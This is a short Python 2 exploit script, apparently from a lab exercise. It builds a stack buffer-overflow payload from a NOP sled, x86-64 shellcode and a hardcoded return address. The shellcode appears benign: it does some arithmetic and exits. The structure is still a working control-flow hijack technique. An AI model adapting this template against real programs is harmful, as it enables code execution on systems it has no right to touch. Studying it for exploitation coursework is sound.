import struct

shellcode =  "\x48\x8d\x25\x00\x00\x00\x00\x55\x48\x89"
shellcode += "\xe5\x48\x83\xec\x10\xc7\x45\xf8\x02\x00"
shellcode += "\x00\x00\xc7\x45\xfc\x06\x00\x00\x00\x8b"
shellcode += "\x55\xfc\x8b\x45\xf8\x89\xd6\x89\xc7\xe8"
shellcode += "\x15\x00\x00\x00\x89\x45\xf8\xb8\x00\x00"
shellcode += "\x00\x00\xc9\x48\x31\xff\x48\xc7\xc0\x3c"
shellcode += "\x00\x00\x00\x0f\x05\x55\x48\x89\xe5\x48"
shellcode += "\x83\xec\x18\x89\x7d\xec\x89\x75\xe8\xc7"
shellcode += "\x45\xf8\x00\x00\x00\x00\xc7\x45\xfc\x00"
shellcode += "\x00\x00\x00\xeb\x16\x8b\x55\xec\x8b\x45"
shellcode += "\xf8\x89\xd6\x89\xc7\xe8\x14\x00\x00\x00"
shellcode += "\x89\x45\xf8\x83\x45\xfc\x01\x8b\x45\xfc"
shellcode += "\x3b\x45\xe8\x7c\xe2\x8b\x45\xf8\xc9\xc3"
shellcode += "\x55\x48\x89\xe5\x89\x7d\xfc\x89\x75\xf8"
shellcode += "\x8b\x55\xfc\x8b\x45\xf8\x01\xd0\x5d\xc3"

payload = '\x90' * (408 - len(shellcode)) + shellcode 
payload += struct.pack("Q",0x7fffffffdbb0)

print payload
